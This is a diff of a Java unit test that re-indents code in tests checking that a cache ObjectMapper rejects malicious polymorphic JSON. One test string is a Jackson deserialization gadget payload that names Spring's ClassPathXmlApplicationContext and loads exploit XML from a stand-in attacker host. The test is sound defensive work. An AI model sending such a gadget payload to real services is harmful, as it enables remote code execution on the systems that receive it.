@@ -34,9 +34,9 @@ class CacheConfigObjectMapperTest {
     private ObjectMapper createCacheObjectMapper() {
         ObjectMapper mapper = new ObjectMapperConfig().objectMapper();
         mapper.activateDefaultTyping(
-                CachePolymorphicTypeValidatorFactory.createDefault(),
-                ObjectMapper.DefaultTyping.NON_FINAL,
-                JsonTypeInfo.As.PROPERTY
+            CachePolymorphicTypeValidatorFactory.createDefault(),
+            ObjectMapper.DefaultTyping.NON_FINAL,
+            JsonTypeInfo.As.PROPERTY
         );
         mapper.registerModule(new Jdk8Module());
         mapper.registerModule(new Hibernate5JakartaModule());
@@ -108,7 +108,7 @@ class CacheConfigObjectMapperTest {
 
         // when & then
         assertThatThrownBy(() -> mapper.readValue(maliciousJson, Object.class))
-                .isInstanceOf(InvalidTypeIdException.class);
+            .isInstanceOf(InvalidTypeIdException.class);
     }
 
     @Test
@@ -120,7 +120,7 @@ class CacheConfigObjectMapperTest {
 
         // when & then
         assertThatThrownBy(() -> mapper.readValue(maliciousJson, Object.class))
-                .isInstanceOf(InvalidTypeIdException.class);
+            .isInstanceOf(InvalidTypeIdException.class);
     }
 
     @Test
@@ -129,10 +129,10 @@ class CacheConfigObjectMapperTest {
         // given
         ObjectMapper mapper = createCacheObjectMapper();
         String maliciousJson =
-                "[\"org.springframework.context.support.ClassPathXmlApplicationContext\",\"http://evil.example.com/exploit.xml\"]";
+            "[\"org.springframework.context.support.ClassPathXmlApplicationContext\",\"http://evil.example.com/exploit.xml\"]";
 
         // when & then
         assertThatThrownBy(() -> mapper.readValue(maliciousJson, Object.class))
-                .isInstanceOf(InvalidTypeIdException.class);
+            .isInstanceOf(InvalidTypeIdException.class);
     }
 }
